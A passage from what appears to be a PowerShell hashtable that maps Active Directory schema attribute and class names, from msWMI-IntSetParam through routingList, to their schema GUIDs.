        "msWMI-IntSetParam" = "292f0d9a-cf76-42b0-841f-b650f331df62";
        "msWMI-IntValidValues" = "6af565f6-a749-4b72-9634-3c5d47e6b4e0";
        "msWMI-MergeablePolicyTemplate" = "07502414-fdca-4851-b04a-13645b11d226";
        "msWMI-Mof" = "6736809f-2064-443e-a145-81262b1f1366";
        "msWMI-Name" = "c6c8ace5-7e81-42af-ad72-77412c5941c4";
        "msWMI-NormalizedClass" = "eaba628f-eb8e-4fe9-83fc-693be695559b";
        "msWMI-ObjectEncoding" = "55dd81c9-c312-41f9-a84d-c6adbdf1e8e1";
        "msWMI-Parm1" = "27e81485-b1b0-4a8b-bedd-ce19a837e26e";
        "msWMI-Parm2" = "0003508e-9c42-4a76-a8f4-38bf64bab0de";
        "msWMI-Parm3" = "45958fb6-52bd-48ce-9f9f-c2712d9f2bfc";
        "msWMI-Parm4" = "3800d5a3-f1ce-4b82-a59a-1528ea795f59";
        "msWMI-PolicyTemplate" = "e2bc80f1-244a-4d59-acc6-ca5c4f82e6e1";
        "msWMI-PolicyType" = "595b2613-4109-4e77-9013-a3bb4ef277c7";
        "msWMI-PropertyName" = "ab920883-e7f8-4d72-b4a0-c0449897509d";
        "msWMI-Query" = "65fff93e-35e3-45a3-85ae-876c6718297f";
        "msWMI-QueryLanguage" = "7d3cfa98-c17b-4254-8bd7-4de9b932a345";
        "msWMI-RangeParam" = "45fb5a57-5018-4d0f-9056-997c8c9122d9";
        "msWMI-RealRangeParam" = "6afe8fe2-70bc-4cce-b166-a96f7359c514";
        "msWMI-Rule" = "3c7e6f83-dd0e-481b-a0c2-74cd96ef2a66";
        "msWMI-ScopeGuid" = "87b78d51-405f-4b7f-80ed-2bd28786f48d";
        "msWMI-ShadowObject" = "f1e44bdf-8dd3-4235-9c86-f91f31f5b569";
        "msWMI-SimplePolicyTemplate" = "6cc8b2b5-12df-44f6-8307-e74f5cdee369";
        "msWMI-Som" = "ab857078-0142-4406-945b-34c9b6b13372";
        "msWMI-SourceOrganization" = "34f7ed6c-615d-418d-aa00-549a7d7be03e";
        "msWMI-StringDefault" = "152e42b6-37c5-4f55-ab48-1606384a9aea";
        "msWMI-StringSetParam" = "0bc579a2-1da7-4cea-b699-807f3b9d63a4";
        "msWMI-StringValidValues" = "37609d31-a2bf-4b58-8f53-2b64e57a076d";
        "msWMI-TargetClass" = "95b6d8d6-c9e8-4661-a2bc-6a5cabc04c62";
        "msWMI-TargetNameSpace" = "1c4ab61f-3420-44e5-849d-8b5dbf60feb7";
        "msWMI-TargetObject" = "c44f67a5-7de5-4a1f-92d9-662b57364b77";
        "msWMI-TargetPath" = "5006a79a-6bfe-4561-9f52-13cf4dd3e560";
        "msWMI-TargetType" = "ca2a281e-262b-4ff7-b419-bc123352a4e9";
        "msWMI-UintRangeParam" = "d9a799b2-cef3-48b3-b5ad-fb85f8dd3214";
        "msWMI-UintSetParam" = "8f4beb31-4e19-46f5-932e-5fa03c339b1d";
        "msWMI-UnknownRangeParam" = "b82ac26b-c6db-4098-92c6-49c18a3336e1";
        "msWMI-WMIGPO" = "05630000-3927-4ede-bf27-ca91f275c26f";
        "mTA" = "a8df74a7-c5ea-11d1-bbcb-0080c76670c0";
        "mTACfg" = "a8df74a8-c5ea-11d1-bbcb-0080c76670c0";
        "mTALocalCred" = "a8df7432-c5ea-11d1-bbcb-0080c76670c0";
        "mTALocalDesig" = "a8df7433-c5ea-11d1-bbcb-0080c76670c0";
        "mustContain" = "bf9679d3-0de6-11d0-a285-00aa003049e2";
        "nAddress" = "a8df7434-c5ea-11d1-bbcb-0080c76670c0";
        "nAddressType" = "a8df7435-c5ea-11d1-bbcb-0080c76670c0";
        "name" = "bf967a0e-0de6-11d0-a285-00aa003049e2";
        "nameServiceFlags" = "80212840-4bdc-11d1-a9c4-0000f80367c1";
        "nCName" = "bf9679d6-0de6-11d0-a285-00aa003049e2";
        "nETBIOSName" = "bf9679d8-0de6-11d0-a285-00aa003049e2";
        "netbootAllowNewClients" = "07383076-91df-11d1-aebc-0000f80367c1";
        "netbootAnswerOnlyValidClients" = "0738307b-91df-11d1-aebc-0000f80367c1";
        "netbootAnswerRequests" = "0738307a-91df-11d1-aebc-0000f80367c1";
        "netbootCurrentClientCount" = "07383079-91df-11d1-aebc-0000f80367c1";
        "netbootDUID" = "532570bd-3d77-424f-822f-0d636dc6daad";
        "netbootGUID" = "3e978921-8c01-11d0-afda-00c04fd930c9";
        "netbootInitialization" = "3e978920-8c01-11d0-afda-00c04fd930c9";
        "netbootIntelliMirrorOSes" = "0738307e-91df-11d1-aebc-0000f80367c1";
        "netbootLimitClients" = "07383077-91df-11d1-aebc-0000f80367c1";
        "netbootLocallyInstalledOSes" = "07383080-91df-11d1-aebc-0000f80367c1";
        "netbootMachineFilePath" = "3e978923-8c01-11d0-afda-00c04fd930c9";
        "netbootMaxClients" = "07383078-91df-11d1-aebc-0000f80367c1";
        "netbootMirrorDataFile" = "2df90d85-009f-11d2-aa4c-00c04fd7d83a";
        "netbootNewMachineNamingPolicy" = "0738307c-91df-11d1-aebc-0000f80367c1";
        "netbootNewMachineOU" = "0738307d-91df-11d1-aebc-0000f80367c1";
        "netbootSCPBL" = "07383082-91df-11d1-aebc-0000f80367c1";
        "netbootServer" = "07383081-91df-11d1-aebc-0000f80367c1";
        "netbootSIFFile" = "2df90d84-009f-11d2-aa4c-00c04fd7d83a";
        "netbootTools" = "0738307f-91df-11d1-aebc-0000f80367c1";
        "networkAddress" = "bf9679d9-0de6-11d0-a285-00aa003049e2";
        "nextLevelStore" = "bf9679da-0de6-11d0-a285-00aa003049e2";
        "nextRid" = "bf9679db-0de6-11d0-a285-00aa003049e2";
        "nisMap" = "7672666c-02c1-4f33-9ecf-f649c1dd9b7c";
        "nisMapEntry" = "4a95216e-fcc0-402e-b57f-5971626148a9";
        "nisMapName" = "969d3c79-0e9a-4d95-b0ac-bdde7ff8f3a1";
        "nisNetgroup" = "72efbf84-6e7b-4a5c-a8db-8a75a7cad254";
        "nisNetgroupTriple" = "a8032e74-30ef-4ff5-affc-0fc217783fec";
        "nisObject" = "904f8a93-4954-4c5f-b1e1-53c097a31e13";
        "nonSecurityMember" = "52458018-ca6a-11d0-afff-0000f80367c1";
        "nonSecurityMemberBL" = "52458019-ca6a-11d0-afff-0000f80367c1";
        "notes" = "6d05fb41-246b-11d0-a9c8-00aa006c33ed";
        "notificationList" = "19195a56-6da0-11d0-afd3-00c04fd930c9";
        "nTDSConnection" = "19195a60-6da0-11d0-afd3-00c04fd930c9";
        "nTDSDSA" = "f0f8ffab-1191-11d0-a060-00aa006c33ed";
        "nTDSDSARO" = "85d16ec1-0791-4bc8-8ab3-70980602ff8c";
        "nTDSService" = "19195a5f-6da0-11d0-afd3-00c04fd930c9";
        "nTDSSiteSettings" = "19195a5d-6da0-11d0-afd3-00c04fd930c9";
        "nTFRSMember" = "2a132586-9373-11d1-aebc-0000f80367c1";
        "nTFRSReplicaSet" = "5245803a-ca6a-11d0-afff-0000f80367c1";
        "nTFRSSettings" = "f780acc2-56f0-11d1-a9c6-0000f80367c1";
        "nTFRSSubscriber" = "2a132588-9373-11d1-aebc-0000f80367c1";
        "nTFRSSubscriptions" = "2a132587-9373-11d1-aebc-0000f80367c1";
        "nTGroupMembers" = "bf9679df-0de6-11d0-a285-00aa003049e2";
        "nTMixedDomain" = "3e97891f-8c01-11d0-afda-00c04fd930c9";
        "ntPwdHistory" = "bf9679e2-0de6-11d0-a285-00aa003049e2";
        "nTSecurityDescriptor" = "bf9679e3-0de6-11d0-a285-00aa003049e2";
        "numOfOpenRetries" = "a8df743a-c5ea-11d1-bbcb-0080c76670c0";
        "numOfTransferRetries" = "a8df743b-c5ea-11d1-bbcb-0080c76670c0";
        "o" = "bf9679ef-0de6-11d0-a285-00aa003049e2";
        "objectCategory" = "26d97369-6070-11d1-a9c6-0000f80367c1";
        "objectClass" = "bf9679e5-0de6-11d0-a285-00aa003049e2";
        "objectClassCategory" = "bf9679e6-0de6-11d0-a285-00aa003049e2";
        "objectClasses" = "9a7ad94b-ca53-11d1-bbd0-0080c76670c0";
        "objectCount" = "34aaa216-b699-11d0-afee-0000f80367c1";
        "objectGUID" = "bf9679e7-0de6-11d0-a285-00aa003049e2";
        "objectSid" = "bf9679e8-0de6-11d0-a285-00aa003049e2";
        "objectVersion" = "16775848-47f3-11d1-a9c3-0000f80367c1";
        "objViewContainers" = "16775847-47f3-11d1-a9c3-0000f80367c1";
        "oEMInformation" = "bf9679ea-0de6-11d0-a285-00aa003049e2";
        "offLineABContainers" = "a8df743c-c5ea-11d1-bbcb-0080c76670c0";
        "offLineABSchedule" = "a8df743d-c5ea-11d1-bbcb-0080c76670c0";
        "offLineABServer" = "a8df743e-c5ea-11d1-bbcb-0080c76670c0";
        "offLineABStyle" = "a8df743f-c5ea-11d1-bbcb-0080c76670c0";
        "oMObjectClass" = "bf9679ec-0de6-11d0-a285-00aa003049e2";
        "oMSyntax" = "bf9679ed-0de6-11d0-a285-00aa003049e2";
        "oMTGuid" = "ddac0cf3-af8f-11d0-afeb-00c04fd930c9";
        "oMTIndxGuid" = "1f0075fa-7e40-11d0-afd6-00c04fd930c9";
        "oncRpc" = "cadd1e5e-fefc-4f3f-b5a9-70e994204303";
        "oncRpcNumber" = "966825f5-01d9-4a5c-a011-d15ae84efa55";
        "oOFReplyToOriginator" = "a8df7440-c5ea-11d1-bbcb-0080c76670c0";
        "openRetryInterval" = "a8df7441-c5ea-11d1-bbcb-0080c76670c0";
        "operatingSystem" = "3e978925-8c01-11d0-afda-00c04fd930c9";
        "operatingSystemHotfix" = "bd951b3c-9c96-11d0-afdd-00c04fd930c9";
        "operatingSystemServicePack" = "3e978927-8c01-11d0-afda-00c04fd930c9";
        "operatingSystemVersion" = "3e978926-8c01-11d0-afda-00c04fd930c9";
        "operatorCount" = "bf9679ee-0de6-11d0-a285-00aa003049e2";
        "optionDescription" = "963d274d-48be-11d1-a9c3-0000f80367c1";
        "options" = "19195a53-6da0-11d0-afd3-00c04fd930c9";
        "optionsLocation" = "963d274e-48be-11d1-a9c3-0000f80367c1";
        "organization" = "bf967aa3-0de6-11d0-a285-00aa003049e2";
        "organizationalPerson" = "bf967aa4-0de6-11d0-a285-00aa003049e2";
        "organizationalRole" = "a8df74bf-c5ea-11d1-bbcb-0080c76670c0";
        "organizationalStatus" = "28596019-7349-4d2f-adff-5a629961f942";
        "organizationalUnit" = "bf967aa5-0de6-11d0-a285-00aa003049e2";
        "originalDisplayTable" = "5fd424ce-1262-11d0-a060-00aa006c33ed";
        "originalDisplayTableMSDOS" = "5fd424cf-1262-11d0-a060-00aa006c33ed";
        "otherFacsimileTelephoneNumber" = "0296c11d-40da-11d1-a9c0-0000f80367c1";
        "otherHomePhone" = "f0f8ffa2-1191-11d0-a060-00aa006c33ed";
        "otherIpPhone" = "4d146e4b-48d4-11d1-a9c3-0000f80367c1";
        "otherLoginWorkstations" = "bf9679f1-0de6-11d0-a285-00aa003049e2";
        "otherMailbox" = "0296c123-40da-11d1-a9c0-0000f80367c1";
        "otherMobile" = "0296c11e-40da-11d1-a9c0-0000f80367c1";
        "otherPager" = "f0f8ffa4-1191-11d0-a060-00aa006c33ed";
        "otherTelephone" = "f0f8ffa5-1191-11d0-a060-00aa006c33ed";
        "otherWellKnownObjects" = "1ea64e5d-ac0f-11d2-90df-00c04fd91ab1";
        "ou" = "bf9679f0-0de6-11d0-a285-00aa003049e2";
        "outboundSites" = "a8df7445-c5ea-11d1-bbcb-0080c76670c0";
        "outgoingMsgSizeLimit" = "a8df7446-c5ea-11d1-bbcb-0080c76670c0";
        "oWAServer" = "a8df7447-c5ea-11d1-bbcb-0080c76670c0";
        "owner" = "bf9679f3-0de6-11d0-a285-00aa003049e2";
        "ownerBL" = "bf9679f4-0de6-11d0-a285-00aa003049e2";
        "packageFlags" = "7d6c0e99-7e20-11d0-afd6-00c04fd930c9";
        "packageName" = "7d6c0e98-7e20-11d0-afd6-00c04fd930c9";
        "packageRegistration" = "bf967aa6-0de6-11d0-a285-00aa003049e2";
        "packageType" = "7d6c0e96-7e20-11d0-afd6-00c04fd930c9";
        "pager" = "f0f8ffa6-1191-11d0-a060-00aa006c33ed";
        "parentCA" = "5245801b-ca6a-11d0-afff-0000f80367c1";
        "parentCACertificateChain" = "963d2733-48be-11d1-a9c3-0000f80367c1";
        "parentGUID" = "2df90d74-009f-11d2-aa4c-00c04fd7d83a";
        "partialAttributeDeletionList" = "28630ec0-41d5-11d1-a9c1-0000f80367c1";
        "partialAttributeSet" = "19405b9e-3cfa-11d1-a9c0-0000f80367c1";
        "pekKeyChangeInterval" = "07383084-91df-11d1-aebc-0000f80367c1";
        "pekList" = "07383083-91df-11d1-aebc-0000f80367c1";
        "pendingCACertificates" = "963d273c-48be-11d1-a9c3-0000f80367c1";
        "pendingParentCA" = "963d273e-48be-11d1-a9c3-0000f80367c1";
        "perMsgDialogDisplayTable" = "5fd424d3-1262-11d0-a060-00aa006c33ed";
        "perRecipDialogDisplayTable" = "5fd424d4-1262-11d0-a060-00aa006c33ed";
        "person" = "bf967aa7-0de6-11d0-a285-00aa003049e2";
        "personalPager" = "a8df7487-c5ea-11d1-bbcb-0080c76670c0";
        "personalTitle" = "16775858-47f3-11d1-a9c3-0000f80367c1";
        "pFContacts" = "f0f8ff98-1191-11d0-a060-00aa006c33ed";
        "photo" = "9c979768-ba1a-4c08-9632-c6a5c1ed649a";
        "physicalDeliveryOfficeName" = "bf9679f7-0de6-11d0-a285-00aa003049e2";
        "physicalLocation" = "b7b13122-b82e-11d0-afee-0000f80367c1";
        "physicalLocationObject" = "b7b13119-b82e-11d0-afee-0000f80367c1";
        "pKICertificateTemplate" = "e5209ca2-3bba-11d2-90cc-00c04fd91ab1";
        "pKICriticalExtensions" = "fc5a9106-3b9d-11d2-90cc-00c04fd91ab1";
        "pKIDefaultCSPs" = "1ef6336e-3b9e-11d2-90cc-00c04fd91ab1";
        "pKIDefaultKeySpec" = "426cae6e-3b9d-11d2-90cc-00c04fd91ab1";
        "pKIEnrollmentAccess" = "926be278-56f9-11d2-90d0-00c04fd91ab1";
        "pKIEnrollmentService" = "ee4aa692-3bba-11d2-90cc-00c04fd91ab1";
        "pKIExpirationPeriod" = "041570d2-3b9e-11d2-90cc-00c04fd91ab1";
        "pKIExtendedKeyUsage" = "18976af6-3b9e-11d2-90cc-00c04fd91ab1";
        "pKIKeyUsage" = "e9b0a87e-3b9d-11d2-90cc-00c04fd91ab1";
        "pKIMaxIssuingDepth" = "f0bfdefa-3b9d-11d2-90cc-00c04fd91ab1";
        "pKIOverlapPeriod" = "1219a3ec-3b9e-11d2-90cc-00c04fd91ab1";
        "pKT" = "8447f9f1-1027-11d0-a05f-00aa006c33ed";
        "pKTGuid" = "8447f9f0-1027-11d0-a05f-00aa006c33ed";
        "policyReplicationFlags" = "19405b96-3cfa-11d1-a9c0-0000f80367c1";
        "pOPCharacterSet" = "bf9679f8-0de6-11d0-a285-00aa003049e2";
        "pOPContentFormat" = "bf9679f9-0de6-11d0-a285-00aa003049e2";
        "portName" = "281416c4-1968-11d0-a28f-00aa003049e2";
        "portNumber" = "a8df744a-c5ea-11d1-bbcb-0080c76670c0";
        "posixAccount" = "ad44bb41-67d5-4d88-b575-7b20674e76d8";
        "posixGroup" = "2a9350b8-062c-4ed0-9903-dde10d06deba";
        "possibleInferiors" = "9a7ad94c-ca53-11d1-bbd0-0080c76670c0";
        "possSuperiors" = "bf9679fa-0de6-11d0-a285-00aa003049e2";
        "postalAddress" = "bf9679fc-0de6-11d0-a285-00aa003049e2";
        "postalCode" = "bf9679fd-0de6-11d0-a285-00aa003049e2";
        "postOfficeBox" = "bf9679fb-0de6-11d0-a285-00aa003049e2";
        "preferredDeliveryMethod" = "bf9679fe-0de6-11d0-a285-00aa003049e2";
        "preferredLanguage" = "856be0d0-18e7-46e1-8f5f-7ee4d9020e0d";
        "preferredOU" = "bf9679ff-0de6-11d0-a285-00aa003049e2";
        "prefixMap" = "52458022-ca6a-11d0-afff-0000f80367c1";
        "presentationAddress" = "a8df744b-c5ea-11d1-bbcb-0080c76670c0";
        "preserveInternetContent" = "a8df744c-c5ea-11d1-bbcb-0080c76670c0";
        "previousCACertificates" = "963d2739-48be-11d1-a9c3-0000f80367c1";
        "previousParentCA" = "963d273d-48be-11d1-a9c3-0000f80367c1";
        "primaryGroupID" = "bf967a00-0de6-11d0-a285-00aa003049e2";
        "primaryGroupToken" = "c0ed8738-7efd-4481-84d9-66d2db8be369";
        "primaryInternationalISDNNumber" = "0296c11f-40da-11d1-a9c0-0000f80367c1";
        "primaryTelexNumber" = "0296c121-40da-11d1-a9c0-0000f80367c1";
        "printAttributes" = "281416d7-1968-11d0-a28f-00aa003049e2";
        "printBinNames" = "281416cd-1968-11d0-a28f-00aa003049e2";
        "printCollate" = "281416d2-1968-11d0-a28f-00aa003049e2";
        "printColor" = "281416d3-1968-11d0-a28f-00aa003049e2";
        "printDuplexSupported" = "281416cc-1968-11d0-a28f-00aa003049e2";
        "printEndTime" = "281416ca-1968-11d0-a28f-00aa003049e2";
        "printerName" = "244b296e-5abd-11d0-afd2-00c04fd930c9";
        "printFormName" = "281416cb-1968-11d0-a28f-00aa003049e2";
        "printKeepPrintedJobs" = "ba305f6d-47e3-11d0-a1a6-00c04fd930c9";
        "printLanguage" = "281416d6-1968-11d0-a28f-00aa003049e2";
        "printMACAddress" = "ba305f7a-47e3-11d0-a1a6-00c04fd930c9";
        "printMaxCopies" = "281416d1-1968-11d0-a28f-00aa003049e2";
        "printMaxResolutionSupported" = "281416cf-1968-11d0-a28f-00aa003049e2";
        "printMaxXExtent" = "ba305f6f-47e3-11d0-a1a6-00c04fd930c9";
        "printMaxYExtent" = "ba305f70-47e3-11d0-a1a6-00c04fd930c9";
        "printMediaReady" = "3bcbfcf5-4d3d-11d0-a1a6-00c04fd930c9";
        "printMediaSupported" = "244b296f-5abd-11d0-afd2-00c04fd930c9";
        "printMemory" = "ba305f74-47e3-11d0-a1a6-00c04fd930c9";
        "printMinXExtent" = "ba305f71-47e3-11d0-a1a6-00c04fd930c9";
        "printMinYExtent" = "ba305f72-47e3-11d0-a1a6-00c04fd930c9";
        "printNetworkAddress" = "ba305f79-47e3-11d0-a1a6-00c04fd930c9";
        "printNotify" = "ba305f6a-47e3-11d0-a1a6-00c04fd930c9";
        "printNumberUp" = "3bcbfcf4-4d3d-11d0-a1a6-00c04fd930c9";
        "printOrientationsSupported" = "281416d0-1968-11d0-a28f-00aa003049e2";
        "printOwner" = "ba305f69-47e3-11d0-a1a6-00c04fd930c9";
        "printPagesPerMinute" = "19405b97-3cfa-11d1-a9c0-0000f80367c1";
        "printQueue" = "bf967aa8-0de6-11d0-a285-00aa003049e2";
        "printRate" = "ba305f77-47e3-11d0-a1a6-00c04fd930c9";
        "printRateUnit" = "ba305f78-47e3-11d0-a1a6-00c04fd930c9";
        "printSeparatorFile" = "281416c6-1968-11d0-a28f-00aa003049e2";
        "printShareName" = "ba305f68-47e3-11d0-a1a6-00c04fd930c9";
        "printSpooling" = "ba305f6c-47e3-11d0-a1a6-00c04fd930c9";
        "printStaplingSupported" = "ba305f73-47e3-11d0-a1a6-00c04fd930c9";
        "printStartTime" = "281416c9-1968-11d0-a28f-00aa003049e2";
        "printStatus" = "ba305f6b-47e3-11d0-a1a6-00c04fd930c9";
        "priority" = "281416c7-1968-11d0-a28f-00aa003049e2";
        "priorSetTime" = "bf967a01-0de6-11d0-a285-00aa003049e2";
        "priorValue" = "bf967a02-0de6-11d0-a285-00aa003049e2";
        "privateKey" = "bf967a03-0de6-11d0-a285-00aa003049e2";
        "privilegeAttributes" = "19405b9a-3cfa-11d1-a9c0-0000f80367c1";
        "privilegeDisplayName" = "19405b98-3cfa-11d1-a9c0-0000f80367c1";
        "privilegeHolder" = "19405b9b-3cfa-11d1-a9c0-0000f80367c1";
        "privilegeValue" = "19405b99-3cfa-11d1-a9c0-0000f80367c1";
        "pRMD" = "a8df744d-c5ea-11d1-bbcb-0080c76670c0";
        "productCode" = "d9e18317-8939-11d1-aebc-0000f80367c1";
        "profilePath" = "bf967a05-0de6-11d0-a285-00aa003049e2";
        "promoExpiration" = "1677585d-47f3-11d1-a9c3-0000f80367c1";
        "protocolCfg" = "a8df74c0-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgHTTP" = "a8df74c1-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgHTTPServer" = "a8df74c2-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgHTTPSite" = "a8df74c3-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgIMAP" = "a8df74c4-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgIMAPServer" = "a8df74c5-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgIMAPSite" = "a8df74c6-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgLDAP" = "a8df74c7-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgLDAPServer" = "a8df74c8-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgLDAPSite" = "a8df74c9-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgNNTP" = "a8df74ca-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgNNTPServer" = "a8df74cb-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgNNTPSite" = "a8df74cc-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgPOP" = "a8df74cd-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgPOPServer" = "a8df74ce-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgPOPSite" = "a8df74cf-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgShared" = "a8df74d0-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgSharedServer" = "a8df74d1-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgSharedSite" = "a8df74d2-c5ea-11d1-bbcb-0080c76670c0";
        "protocolCfgSMTP" = "33f98980-a982-11d2-a9ff-00c04f8eedd8";
        "protocolCfgSMTPDomain" = "33d82894-a982-11d2-a9ff-00c04f8eedd8";
        "protocolCfgSMTPDomainContainer" = "33bb8c5c-a982-11d2-a9ff-00c04f8eedd8";
        "protocolCfgSMTPRoutingSources" = "3397c916-a982-11d2-a9ff-00c04f8eedd8";
        "protocolCfgSMTPServer" = "3378ca84-a982-11d2-a9ff-00c04f8eedd8";
        "protocolCfgSMTPSessions" = "8ef628c6-b093-11d2-aa06-00c04f8eedd8";
        "protocolCfgSMTPSite" = "32f0e47a-a982-11d2-a9ff-00c04f8eedd8";
        "protocolSettings" = "1677585e-47f3-11d1-a9c3-0000f80367c1";
        "proxiedObjectName" = "e1aea402-cd5b-11d0-afff-0000f80367c1";
        "proxyAddresses" = "bf967a06-0de6-11d0-a285-00aa003049e2";
        "proxyGenerationEnabled" = "5fd424d6-1262-11d0-a060-00aa006c33ed";
        "proxyGeneratorDLL" = "a8df744e-c5ea-11d1-bbcb-0080c76670c0";
        "proxyLifetime" = "bf967a07-0de6-11d0-a285-00aa003049e2";
        "pSelector" = "a8df7448-c5ea-11d1-bbcb-0080c76670c0";
        "pSelectorInbound" = "a8df7449-c5ea-11d1-bbcb-0080c76670c0";
        "publicDelegates" = "f0f8ff9a-1191-11d0-a060-00aa006c33ed";
        "publicDelegatesBL" = "bf967a08-0de6-11d0-a285-00aa003049e2";
        "publicFolder" = "f0f8ffac-1191-11d0-a060-00aa006c33ed";
        "publicKeyPolicy" = "80a67e28-9f22-11d0-afdd-00c04fd930c9";
        "purportedSearch" = "b4b54e50-943a-11d1-aebd-0000f80367c1";
        "pwdHistoryLength" = "bf967a09-0de6-11d0-a285-00aa003049e2";
        "pwdLastSet" = "bf967a0a-0de6-11d0-a285-00aa003049e2";
        "pwdProperties" = "bf967a0b-0de6-11d0-a285-00aa003049e2";
        "qualityOfService" = "80a67e4e-9f22-11d0-afdd-00c04fd930c9";
        "queryFilter" = "cbf70a26-7e78-11d2-9921-0000f87a57d4";
        "queryPoint" = "7bfdcb86-4807-11d1-a9c3-0000f80367c1";
        "queryPolicy" = "83cc7075-cca7-11d0-afff-0000f80367c1";
        "queryPolicyBL" = "e1aea404-cd5b-11d0-afff-0000f80367c1";
        "queryPolicyObject" = "e1aea403-cd5b-11d0-afff-0000f80367c1";
        "quotaNotificationSchedule" = "a8df744f-c5ea-11d1-bbcb-0080c76670c0";
        "quotaNotificationStyle" = "a8df7450-c5ea-11d1-bbcb-0080c76670c0";
        "rangeLower" = "bf967a0c-0de6-11d0-a285-00aa003049e2";
        "rangeUpper" = "bf967a0d-0de6-11d0-a285-00aa003049e2";
        "rASCallbackNumber" = "a8df7452-c5ea-11d1-bbcb-0080c76670c0";
        "rASPhonebookEntryName" = "a8df7455-c5ea-11d1-bbcb-0080c76670c0";
        "rASPhoneNumber" = "a8df7454-c5ea-11d1-bbcb-0080c76670c0";
        "rASRemoteSRVRName" = "a8df7456-c5ea-11d1-bbcb-0080c76670c0";
        "rASStack" = "a8df74d3-c5ea-11d1-bbcb-0080c76670c0";
        "rASX400Link" = "a8df74d4-c5ea-11d1-bbcb-0080c76670c0";
        "rDNAttID" = "bf967a0f-0de6-11d0-a285-00aa003049e2";
        "referralList" = "a8df7457-c5ea-11d1-bbcb-0080c76670c0";
        "registeredAddress" = "bf967a10-0de6-11d0-a285-00aa003049e2";
        "remoteBridgeHead" = "a8df7458-c5ea-11d1-bbcb-0080c76670c0";
        "remoteBridgeHeadAddress" = "a8df7459-c5ea-11d1-bbcb-0080c76670c0";
        "remoteDXA" = "a8df74d5-c5ea-11d1-bbcb-0080c76670c0";
        "remoteMailRecipient" = "bf967aa9-0de6-11d0-a285-00aa003049e2";
        "remoteServerName" = "bf967a12-0de6-11d0-a285-00aa003049e2";
        "remoteSite" = "a8df745b-c5ea-11d1-bbcb-0080c76670c0";
        "remoteSource" = "bf967a14-0de6-11d0-a285-00aa003049e2";
        "remoteSourceType" = "bf967a15-0de6-11d0-a285-00aa003049e2";
        "remoteStorageGUID" = "2a39c5b0-8960-11d1-aebc-0000f80367c1";
        "remoteStorageServicePoint" = "2a39c5bd-8960-11d1-aebc-0000f80367c1";
        "replicaSource" = "bf967a18-0de6-11d0-a285-00aa003049e2";
        "replicatedObjectVersion" = "1677586c-47f3-11d1-a9c3-0000f80367c1";
        "replicationMailMsgSize" = "a8df745c-c5ea-11d1-bbcb-0080c76670c0";
        "replicationSensitivity" = "bf967a1b-0de6-11d0-a285-00aa003049e2";
        "replicationSignature" = "9909d92a-b093-11d2-aa06-00c04f8eedd8";
        "replicationStagger" = "a8df745d-c5ea-11d1-bbcb-0080c76670c0";
        "replInterval" = "45ba9d1a-56fa-11d2-90d0-00c04fd91ab1";
        "replPropertyMetaData" = "281416c0-1968-11d0-a28f-00aa003049e2";
        "replTopologyStayOfExecution" = "7bfdcb83-4807-11d1-a9c3-0000f80367c1";
        "replUpToDateVector" = "bf967a16-0de6-11d0-a285-00aa003049e2";
        "reportToOriginator" = "a8df745e-c5ea-11d1-bbcb-0080c76670c0";
        "reportToOwner" = "a8df745f-c5ea-11d1-bbcb-0080c76670c0";
        "repsFrom" = "bf967a1d-0de6-11d0-a285-00aa003049e2";
        "repsTo" = "bf967a1e-0de6-11d0-a285-00aa003049e2";
        "reqSeq" = "a8df7460-c5ea-11d1-bbcb-0080c76670c0";
        "requiredCategories" = "7d6c0e93-7e20-11d0-afd6-00c04fd930c9";
        "requireSSL" = "a8df7461-c5ea-11d1-bbcb-0080c76670c0";
        "residentialPerson" = "a8df74d6-c5ea-11d1-bbcb-0080c76670c0";
        "responsibleLocalDXA" = "a8df7462-c5ea-11d1-bbcb-0080c76670c0";
        "retiredReplDSASignatures" = "7bfdcb7f-4807-11d1-a9c3-0000f80367c1";
        "returnExactMsgSize" = "a8df7463-c5ea-11d1-bbcb-0080c76670c0";
        "revision" = "bf967a21-0de6-11d0-a285-00aa003049e2";
        "rFC822LocalPart" = "b93e3a78-cbae-485e-a07b-5ef4ae505686";
        "rFC1006Stack" = "a8df74d7-c5ea-11d1-bbcb-0080c76670c0";
        "rFC1006X400Link" = "a8df74d8-c5ea-11d1-bbcb-0080c76670c0";
        "rid" = "bf967a22-0de6-11d0-a285-00aa003049e2";
        "rIDAllocationPool" = "66171889-8f3c-11d0-afda-00c04fd930c9";
        "rIDAvailablePool" = "66171888-8f3c-11d0-afda-00c04fd930c9";
        "rIDManager" = "6617188d-8f3c-11d0-afda-00c04fd930c9";
        "rIDManagerReference" = "66171886-8f3c-11d0-afda-00c04fd930c9";
        "rIDNextRID" = "6617188c-8f3c-11d0-afda-00c04fd930c9";
        "rIDPreviousAllocationPool" = "6617188a-8f3c-11d0-afda-00c04fd930c9";
        "ridServer" = "a8df7464-c5ea-11d1-bbcb-0080c76670c0";
        "rIDSet" = "7bfdcb89-4807-11d1-a9c3-0000f80367c1";
        "rIDSetReferences" = "7bfdcb7b-4807-11d1-a9c3-0000f80367c1";
        "rIDUsedPool" = "6617188b-8f3c-11d0-afda-00c04fd930c9";
        "rightsGuid" = "8297931c-86d3-11d0-afda-00c04fd930c9";
        "roleOccupant" = "a8df7465-c5ea-11d1-bbcb-0080c76670c0";
        "room" = "7860e5d2-c8b0-4cbb-bd45-d9455beb9206";
        "roomNumber" = "81d7f8c2-e327-4a0d-91c6-b42d4009115f";
        "rootNewsgroupsFolderID" = "a8df7466-c5ea-11d1-bbcb-0080c76670c0";
        "rootTrust" = "7bfdcb80-4807-11d1-a9c3-0000f80367c1";
        "routingList" = "a8df7467-c5ea-11d1-bbcb-0080c76670c0";
